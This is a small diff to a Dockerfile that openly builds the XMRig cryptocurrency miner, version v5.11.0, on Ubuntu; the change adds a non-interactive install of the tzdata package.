@@ -1,5 +1,5 @@
 FROM ubuntu:latest AS build
-
+RUN DEBIAN_FRONTEND=noninteractive apt install -y tzdata
 ARG XMRIG_VERSION='v5.11.0'
 
 RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
